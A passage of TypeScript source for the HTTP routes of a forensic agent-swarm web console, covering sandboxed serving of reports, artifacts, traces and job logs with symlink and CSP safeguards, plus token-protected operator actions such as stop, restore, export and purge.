        const params = await prepareStart(await readBody(req));
        json(res, 202, runner.start(params));
        return;
      }
      throw new HttpError(405, "method not allowed");
    }

    const parts = path.split("/").filter(Boolean);
    if (parts[0] !== "api" || parts[1] !== "swarms" || !parts[2]) throw new HttpError(404, "not found");
    const id = safeId(parts[2]);
    const sub = parts[3];
    const rest = parts.slice(4);

    if (!sub) {
      if (method !== "GET") throw new HttpError(405, "method not allowed");
      const traceLimit = Number(url.searchParams.get("traces")) || 400;
      const view = await readSwarmView(runsDir, id, traceLimit);
      if (!view) throw new HttpError(404, "swarm not found");
      json(res, 200, view);
      return;
    }

    const { sandbox } = await requireRun(id);

    switch (sub) {
      // The contract this swarm is actually running under, read from the
      // sandbox rather than the registry — the registry holds the goal document
      // the operator submitted, this is the rendered SWARM.md the agents see.
      // Read-only on purpose: a writable contract is a swarm that can certify
      // itself, which is the whole reason SWARM.md is a protected path.
      case "contract": {
        if (method !== "GET") throw new HttpError(405, "the live contract is read-only");
        const file = join(sandbox, "SWARM.md");
        // A shell command inside the sandbox can replace SWARM.md with a
        // symlink — the write guard blocks `write`/`edit`, not `ln -s`. Serving
        // it blind would turn an open read endpoint into a file-disclosure one.
        const real = await realpath(file).catch(() => null);
        const realSandbox = await realpath(sandbox).catch(() => resolve(sandbox));
        if (!real || !real.startsWith(realSandbox + sep)) {
          throw new HttpError(409, "SWARM.md is missing or no longer a file inside the sandbox");
        }
        try {
          const [text, info] = await Promise.all([readFile(real, "utf8"), stat(real)]);
          json(res, 200, { id, text, bytes: info.size, updated_at: info.mtime.toISOString() });
        } catch {
          throw new HttpError(404, "this swarm has no SWARM.md");
        }
        return;
      }
      /**
       * The dossier, as files. The path says "dossier" and not "download"
       * because a URL with "download" in it is a common ad-blocker pattern,
       * and a blocked iframe shows the operator a blank report with no error
       * anywhere they would think to look. Nothing here is newly exposed: the console
       * already serves all of this content through the view routes without a
       * token, and docs/safety.md says so. What is new is that it arrives
       * with a filename, and that the trace arrives *whole* — the view route
       * clamps to the last 5000 events, which on a nineteen-thousand-event
       * run silently drops the beginning of the investigation.
       */
      case "dossier": {
        if (method !== "GET") throw new HttpError(405, "method not allowed");
        const what = rest.join("/");
        const attach = (name: string, type: string) => ({
          "content-type": type,
          "content-disposition": `attachment; filename="${id}-${name}"`,
          "x-content-type-options": "nosniff",
        });
        const send = (name: string, type: string, body: string) => {
          res.writeHead(200, { ...attach(name, type), "content-length": String(Buffer.byteLength(body)) });
          res.end(body);
        };
        // No filename: the handover as one JSON product. The Report tab used
        // to fetch the HTML and the artifact index separately, each walking
        // work/, and the download rows were a hardcoded list with no hash.
        if (!what) {
          const dossier = await buildDossier(sandbox, { runsDir });
          json(res, 200, {
            html: dossier.reportHtml,
            summary: dossier.summaryMd,
            artifactsJson: dossier.artifactsJson,
            artifacts: dossier.artifacts,
            // The court set around the report: the custody verdict and its
            // anchor, the evidence manifest, each VM's record and this run's
            // lines of the operator's record, each with the hash of its bytes.
            files: [...dossier.files, ...(await courtFiles(sandbox, id))],
          });
          return;
        }
        const court = await courtFile(sandbox, id, what);
        if (court) {
          if (court.body !== undefined) {
            send(court.name, court.type, court.body);
            return;
          }
          await sendFile(res, court.abs!, attach(court.name, court.type)).catch(() => {
            throw new HttpError(404, `this run has no ${what}`);
          });
          return;
        }
        if (what === "summary.md") {
          send("summary.md", "text/markdown; charset=utf-8", await summarize(sandbox, { runsDir }));
          return;
        }
        if (what === "report.html") {
          // The console frames this in an iframe, so it is served inline with
          // the same sandbox the artifact route uses: agent-derived text that
          // must not reach this app or the network.
          const html = await renderReport(sandbox, { runsDir });
          res.writeHead(200, {
            "content-type": "text/html; charset=utf-8",
            "content-length": String(Buffer.byteLength(html)),
            "content-security-policy":
              "sandbox; default-src 'none'; style-src 'unsafe-inline'; img-src data:; font-src data:; connect-src 'none'; form-action 'none'; base-uri 'none'",
            "x-content-type-options": "nosniff",
          });
          res.end(html);
          return;
        }
        if (what === "artifacts.json") {
          const index = await hashArtifacts(sandbox);
          send("artifacts.json", "application/json; charset=utf-8", `${JSON.stringify(index, null, 2)}\n`);
          return;
        }
        const FILES: Record<string, { rel: string; type: string }> = {
          "ledger.jsonl": { rel: "ledger/entries.jsonl", type: "application/x-ndjson; charset=utf-8" },
          "ledger.md": { rel: "ledger/ledger.md", type: "text/markdown; charset=utf-8" },
          "trace.jsonl": { rel: EVENTS_REL, type: "application/x-ndjson; charset=utf-8" },
        };
        const entry = FILES[what];
        if (!entry) throw new HttpError(404, `no such download: ${what || "(none)"}`);
        // A fixed relative path from a closed table, so there is nothing for
        // a caller to traverse with; the check is that the run has the file.
        await sendFile(res, join(sandbox, entry.rel), attach(what, entry.type)).catch(() => {
          throw new HttpError(404, `this run has no ${what}`);
        });
        return;
      }
      /**
       * Every file under work/ with its sha256, hashed on demand. It is not
       * folded into the swarm view because the extracted tree reaches
       * gigabytes and the view is read on every change; the Artifacts tab
       * asks for this when it opens.
       */
      case "artifacts": {
        if (method !== "GET") throw new HttpError(405, "method not allowed");
        json(res, 200, await hashArtifacts(sandbox));
        return;
      }
      case "checks": {
        if (method !== "GET") throw new HttpError(405, "method not allowed");
        json(res, 200, await runChecks(id, sandbox));
        return;
      }
      case "threads": {
        const thread = safeId(rest[0]);
        json(res, 200, await readTimedPosts(sandbox, thread));
        return;
      }
      /**
       * Every post across every thread, bodies included — what the board
       * analytics reads. Kept out of the swarm view because the view is
       * re-read on every change and this is the whole conversation.
       */
      case "posts": {
        if (method !== "GET") throw new HttpError(405, "method not allowed");
        json(res, 200, await readAllPosts(sandbox));
        return;
      }
      case "traces": {
        json(
          res,
          200,
          await queryTraces(sandbox, {
            agent: url.searchParams.get("agent") || undefined,
            tool: url.searchParams.get("tool") || undefined,
            q: url.searchParams.get("q") || undefined,
            limit: Number(url.searchParams.get("limit")) || undefined,
            order: url.searchParams.get("order") === "desc" ? "desc" : "asc",
            spilled: url.searchParams.get("spilled") === "1",
          }),
        );
        return;
      }
      case "tools": {
        // Read-only: a forged tool is agent-written code, and the only way to
        // change one is make_tool from inside the swarm.
        if (method !== "GET") throw new HttpError(405, "forged tools are read-only here");
        const name = rest[0] ?? "";
        if (!TOOL_NAME_RE.test(name)) throw new HttpError(400, "invalid tool name");
        const tool = await readForgedTool(sandbox, name);
        if (!tool) throw new HttpError(404, "no such forged tool");
        json(res, 200, { id, ...tool });
        return;
      }
      case "work": {
        if (!rest.length) {
          json(res, 200, await listWorkFiles(sandbox));
          return;
        }
        const rel = decodeURIComponent(rest.join("/"));
        // The lexical check stops `..`; it does not stop a symlink an agent's
        // shell planted under work/. This route needs no token (whoever
        // reaches the console may read it), so the resolver refuses a link
        // outright and confirms what is left really lives under work/.
        const abs = await resolveWorkFile(sandbox, rel);
        if (typeof abs !== "string") throw new HttpError(abs.error, abs.message);
        const download = url.searchParams.get("download") === "1";
        const grantId = url.searchParams.get("scripts");
        if (grantId && !download) {
          // A grant is spent by being presented, whatever the answer, so it
          // can be neither replayed nor probed.
          const grant = scriptGrants.get(grantId);
          scriptGrants.delete(grantId);
          const opened = await openRegular(abs);
          if ("why" in opened) throw new HttpError(404, opened.why === "missing" ? "no such file" : `not served: ${opened.why}`);
          if (opened.size > SCRIPTS_MAX_BYTES) {
            await opened.handle.close();
            await sendFile(res, abs, { "content-security-policy": ARTIFACT_CSP, "x-content-type-options": "nosniff", "x-artifact-scripts": "off" });
            return;
          }
          let bytes: Buffer;
          try {
            bytes = await opened.handle.readFile();
          } finally {
            await opened.handle.close();
          }
          // The bytes served are the bytes hashed: a file changed since the
          // operator was shown its hash is served without its scripts.
          const sha256 = createHash("sha256").update(bytes).digest("hex");
          const scripted = Boolean(grant && grant.run === id && grant.rel === rel && grant.expires >= Date.now() && grant.sha256 === sha256);
          if (scripted) {
            // An operator's action, on the run's own trace: which file, which
            // bytes, when (the line's ts), who, from where.
            const action = { path: `work/${rel}`, sha256, via: "web", os_user: osUser, remote: req.socket.remoteAddress ?? null };
            await appendEvent(sandbox, { agent: "operator", tool: "artifact_scripts", args: action, result: { ok: true, opened_with_scripts: true } }).catch((err) => {
              console.error(`ui: operator opened ${action.path} (sha256 ${sha256}) with scripts at ${new Date().toISOString()}${osUser ? ` as ${osUser}` : ""}; the run's trace could not take the line: ${(err as Error).message}`);
            });
          }
          res.writeHead(
            200,
            fileHeaders(abs, bytes.length, { "content-security-policy": scripted ? ARTIFACT_SCRIPTS_CSP : ARTIFACT_CSP, "x-content-type-options": "nosniff", "x-artifact-scripts": scripted ? "on" : "off" }, false),
          );
          res.end(bytes);
          return;
        }
        await sendFile(res, abs, { "content-security-policy": ARTIFACT_CSP, "x-content-type-options": "nosniff" }, download);
        return;
      }
      /**
       * A one-time grant to open one HTML artifact with its scripts, asked
       * for by the console after the operator confirmed the warning. Needs
       * the token: the artifact, framed with no scripts and no token, cannot
       * ask for its own.
       */
      case "work-scripts": {
        if (method !== "POST") throw new HttpError(405, "method not allowed");
        requireToken(req, url);
        const body = (await readBody(req)) as { path?: unknown };
        const rel = (typeof body.path === "string" ? body.path : "").replace(/^work\//, "");
        if (!/\.html?$/i.test(rel)) throw new HttpError(400, "only an HTML artifact is opened with its scripts");
        const abs = await resolveWorkFile(sandbox, rel);
        if (typeof abs !== "string") throw new HttpError(abs.error, abs.message);
        const hashed = await hashRegularFile(abs);
        if (hashed === null || "why" in hashed) throw new HttpError(404, "no such file");
        if (hashed.size > SCRIPTS_MAX_BYTES) throw new HttpError(413, `an artifact over ${SCRIPTS_MAX_BYTES} bytes is not opened with its scripts`);
        const now = Date.now();
        for (const [k, g] of scriptGrants) if (g.expires < now) scriptGrants.delete(k);
        const grant = randomBytes(24).toString("base64url");
        scriptGrants.set(grant, { run: id, rel, sha256: hashed.sha256, expires: now + scriptGrantTtlMs });
        json(res, 200, { grant, path: `work/${rel}`, sha256: hashed.sha256, expires_in_ms: scriptGrantTtlMs });
        return;
      }
      /**
       * The whole output of a tool call whose result reached the model as a
       * prefix: the file a trace row's `full_output` names. Served as plain
       * text whatever it is called, with the same symlink checks as an
       * artifact; the sha256 on the row is what to compare it against.
       */
      case "tool-output": {
        if (method !== "GET") throw new HttpError(405, "method not allowed");
        if (!rest.length) throw new HttpError(404, "name the file a trace row's full_output points at");
        const rel = decodeURIComponent(rest.join("/"));
        const abs = await resolveToolOutputFile(sandbox, rel);
        if (typeof abs !== "string") throw new HttpError(abs.error, abs.message);
        await sendFile(
          res,
          abs,
          {
            "content-type": "text/plain; charset=utf-8",
            "content-security-policy": "sandbox; default-src 'none'",
            "x-content-type-options": "nosniff",
          },
          url.searchParams.get("download") === "1",
        );
        return;
      }
      /**
       * The run's tool jobs, from the job service's journal: a page of jobs
       * with the totals over all of them, the run's notes and notices, and
       * custody's store line; one job with its record, its journal lines and
       * a page of its manifest; a page of one of its logs, or the log whole
       * (?raw=1). Read-only: the hub is the store's one writer. A run with
       * no store/journal.jsonl answers that it had no job service.
       */
      case "jobs": {
        if (method !== "GET") throw new HttpError(405, "the job record is read-only here");
        const offset = Number(url.searchParams.get("offset")) || 0;
        const limit = Number(url.searchParams.get("limit")) || undefined;
        if (!rest.length) {
          json(res, 200, await readStoreJobs(sandbox, { offset, limit }));
          return;
        }
        const job = rest[0];
        if (rest.length === 1) {
          const detail = await readStoreJob(sandbox, job, { tree: url.searchParams.get("tree") ?? undefined, offset, limit });
          if ("error" in detail) throw new HttpError(detail.error, detail.message);
          json(res, 200, detail);
          return;
        }
        if (rest.length === 3 && rest[1] === "log") {
          const name = decodeURIComponent(rest[2]);
          if (url.searchParams.get("raw") === "1") {
            // Whole, as plain text whatever the job printed, with the same
            // headers as a tool's kept output.
            const abs = await storeJobLogFile(sandbox, job, name);
            if (typeof abs !== "string") throw new HttpError(abs.error, abs.message);
            await sendFile(res, abs, { "content-type": "text/plain; charset=utf-8", "content-security-policy": "sandbox; default-src 'none'", "x-content-type-options": "nosniff" }, url.searchParams.get("download") === "1");
            return;
          }
          const page = await readStoreJobLog(sandbox, job, name, { offset, limit });
          if ("error" in page) throw new HttpError(page.error, page.message);
          json(res, 200, page);
          return;
        }
        throw new HttpError(404, "not found");
      }
      case "history": {
        if (method === "GET" && !rest.length) {
          json(res, 200, await readHistory(sandbox));
          return;
        }
        if (method === "GET" && rest[0] === "rev") {
          const rel = url.searchParams.get("path") ?? "";
          const rev = Number(url.searchParams.get("rev"));
          if (!rel.startsWith("work/") || !Number.isInteger(rev)) throw new HttpError(400, "path and rev required");
          const version = await readFileVersion(sandbox, rel, rev).catch(() => null);
          if (!version) throw new HttpError(404, "revision not found");
          json(res, 200, { ...version, text: version.text.slice(0, 256 * 1024), versions: await listFileHistory(sandbox, rel) });
          return;
        }
        if (method === "POST" && rest[0] === "restore") {
          requireToken(req, url);
          const body = (await readBody(req)) as { path?: unknown; rev?: unknown };
          const rel = typeof body.path === "string" ? body.path : "";
          const rev = Number(body.rev);
          if (!rel.startsWith("work/") || !Number.isInteger(rev)) throw new HttpError(400, "path and rev required");
          const ctx = createContext(sandbox, "operator");
          const claim = await claimFile(ctx, rel, {
            reason: `operator restore to rev ${rev} via the web app`,
            seconds: 60,
          });
          if (!claim.ok) {
            if ("protected" in claim) {
              json(res, 400, { ok: false, reason: claim.note, path: claim.path });
              return;
            }
            json(res, 409, { ok: false, reason: `held by ${claim.owner}`, owner: claim.owner, expires_at: claim.expires_at });
            return;
          }
          let result: Awaited<ReturnType<typeof restoreFileVersion>>;
          try {
            result = await restoreFileVersion(ctx, rel, rev);
          } finally {
            await releaseFile(ctx, rel);
          }
          await appendEvent(sandbox, {
            agent: "operator",
            tool: "file_restore",
            args: { path: rel, rev, via: "web" },
            result,
          });
          json(res, result.ok ? 200 : 400, result);
          return;
        }
        throw new HttpError(404, "not found");
      }
      case "stop": {
        if (method !== "POST") throw new HttpError(405, "method not allowed");
        requireToken(req, url);
        // The custody options are swarm.sh stop's own: skip the host's
        // custody check, or bound it. Nothing else is taken from the body.
        const body = (await readBody(req)) as { no_custody?: unknown; custody_timeout?: unknown };
        const timeout = body.custody_timeout === undefined || body.custody_timeout === null || body.custody_timeout === "" ? undefined : Number(body.custody_timeout);
        if (timeout !== undefined && (!Number.isInteger(timeout) || timeout < 1 || timeout > 7 * 24 * 3600)) throw new HttpError(400, "custody_timeout must be a whole number of seconds, 1 to 604800");
        json(res, 202, runner.stop(id, { no_custody: body.no_custody === true, custody_timeout: timeout }));
        return;
      }
      case "reap": {
        if (method !== "POST") throw new HttpError(405, "method not allowed");
        requireToken(req, url);
        const body = (await readBody(req)) as { stall_sec?: unknown; stop?: unknown };
        const stall = body.stall_sec === undefined ? undefined : Number(body.stall_sec);
        if (stall !== undefined && (!Number.isInteger(stall) || stall < 1)) throw new HttpError(400, "stall_sec must be a positive integer");
        json(res, 202, runner.reap(id, { stall_sec: stall, stop: body.stop === true }));
        return;
      }
      // Who did what to this run: its lines in runs/operator-audit.jsonl
      // (the chain checked over the whole file) and its operator lines on
      // the trace.
      case "operator": {
        if (method !== "GET") throw new HttpError(405, "method not allowed");
        json(res, 200, await operatorAudit(runsDir, id, await readRunEvents(sandbox)));
        return;
      }
      // Which inputs no command named, and which ledger entries no call
      // before them named their source: generic path matching over the
      // trace. "No command named it" is all it can say; a named input is not
      // an examined one.
      case "coverage": {
        if (method !== "GET") throw new HttpError(405, "method not allowed");
        json(res, 200, await coverageOf(sandbox));
        return;
      }
      // The examiner's review: read here, written by scripts/review.ts
      // through `swarm.sh review` (its one writer), outside the run where no
      // agent reaches it.
      case "review": {
        if (method === "GET") {
          json(res, 200, await readReviews(runsDir, id));
          return;
        }
        if (method !== "POST") throw new HttpError(405, "method not allowed");
        requireToken(req, url);
        const check = validateReview(await readBody(req));
        if (!check.ok) throw new HttpError(400, check.error);
        json(res, 202, runner.review(id, check.params));
        return;
      }
      case "hold":
      case "release": {
        if (method !== "POST") throw new HttpError(405, "method not allowed");
        requireToken(req, url);
        if (sub === "release") {
          json(res, 202, runner.release(id));
          return;
        }
        const body = (await readBody(req)) as { reason?: unknown };
        const reason = typeof body.reason === "string" ? body.reason.trim() : "";
        if (reason.length > 500 || /[\x00-\x1f\x7f]/.test(reason)) throw new HttpError(400, "reason: one line, at most 500 characters");
        json(res, 202, runner.hold(id, reason || undefined));
        return;
      }
      case "export": {
        if (method !== "POST") throw new HttpError(405, "method not allowed");
        requireToken(req, url);
        const body = (await readBody(req)) as { format?: unknown };
        const format = body.format === "timesketch" ? "timesketch" : body.format === "csv" || body.format === undefined ? "csv" : null;
        if (!format) throw new HttpError(400, "format must be csv or timesketch");
        const dir = await mkdtemp(join(tmpdir(), "dfirswarm-export-"));
        json(res, 202, runner.export(id, format, join(dir, `${id}-ledger${format === "timesketch" ? "-timesketch" : ""}.csv`)));
        return;
      }
      // What swarm.sh package left (read here), or a new package (a job).
      case "package": {
        if (method === "GET") {
          json(res, 200, await packageInfo(sandbox));
          return;
        }
        if (method !== "POST") throw new HttpError(405, "method not allowed");
        requireToken(req, url);
        const body = (await readBody(req)) as { sign?: unknown };
        json(res, 202, runner.package(id, body.sign === true));
        return;
      }
      // The run's package as one zip, made from the directory swarm.sh wrote
      // into the console's own temp directory, served and then removed.
      // swarm.sh verify takes the zip as it takes the directory.
      case "package.zip": {
        if (method !== "GET") throw new HttpError(405, "method not allowed");
        const info = await packageInfo(sandbox);
        if (!info.present) throw new HttpError(404, info.error ?? "no package yet: package the run first");
        const tmp = await mkdtemp(join(tmpdir(), "dfirswarm-package-"));
        const file = join(tmp, `${id}-package.zip`);
        try {
          const made = await zipDirectory(info.dir, file, `${id}-package`).catch((err: Error) => {
            throw new HttpError(413, err.message);
          });
          const extra: Record<string, string> = { "x-package-manifest-sha256": info.manifest_sha256 ?? "" };
          if (made.left_out.length) extra["x-package-left-out"] = String(made.left_out.length);
          await sendFile(res, file, extra, true);
          // The file stays until the response is through, then goes.
          await finished(res).catch(() => undefined);
        } finally {
          await rm(tmp, { recursive: true, force: true });
        }
        return;
      }
      case "verify": {
        if (method !== "POST") throw new HttpError(405, "method not allowed");
        requireToken(req, url);
        const body = (await readBody(req)) as { package?: unknown };
        const pkg = typeof body.package === "string" ? body.package.trim() : "";
        if (!pkg.startsWith("/") || /[\x00-\x1f\x7f]/.test(pkg) || pkg.length > 2048) throw new HttpError(400, "package: the absolute path of the package directory or zip");
        json(res, 202, runner.verify(id, pkg));
        return;
      }
      // Deleting a run's sandbox, disks and hub directory. The body names
      // the run again, typed by the operator; swarm.sh refuses a running or
      // held run and leaves a destruction record.
      case "purge": {
        if (method !== "POST") throw new HttpError(405, "method not allowed");
        requireToken(req, url);
        const body = (await readBody(req)) as { confirm?: unknown };
        if (body.confirm !== id) throw new HttpError(400, `type the run id (${id}) to confirm the purge`);
        json(res, 202, runner.purge(id));
        return;
      }
      default:
        throw new HttpError(404, "not found");
    }
  }

  const server = createServer((req, res) => {
    handle(req, res).catch((err: unknown) => {
      if (res.headersSent) {
        res.end();
        return;
      }
      if (err instanceof HttpError) {
        json(res, err.status, { error: err.message });
        return;
      }
      json(res, 500, { error: (err as Error).message });
    });
  });

  return {
    server,
    bus,
    hubWatch,
    runner,
    async listen(port, host) {
      await bus.start();
      hubWatch.start();
      await new Promise<void>((done, fail) => {
        server.once("error", fail);
        server.listen(port, host, () => done());
      });
      const addr = server.address();
      return { port: typeof addr === "object" && addr ? addr.port : port, host };
    },
    async close() {
      for (const client of sseClients) client.end();
      sseClients.clear();
      unwatchRegistry();
      hubWatch.close();
      bus.close();
      await new Promise<void>((done) => server.close(() => done()));
    },
  };
}

export async function readVersion(root: string): Promise<string> {
  try {
    const pkg = JSON.parse(await readFile(join(root, "package.json"), "utf8")) as { version?: string };
    return pkg.version ?? "0.0.0";
  } catch {
    return "0.0.0";
  }
}
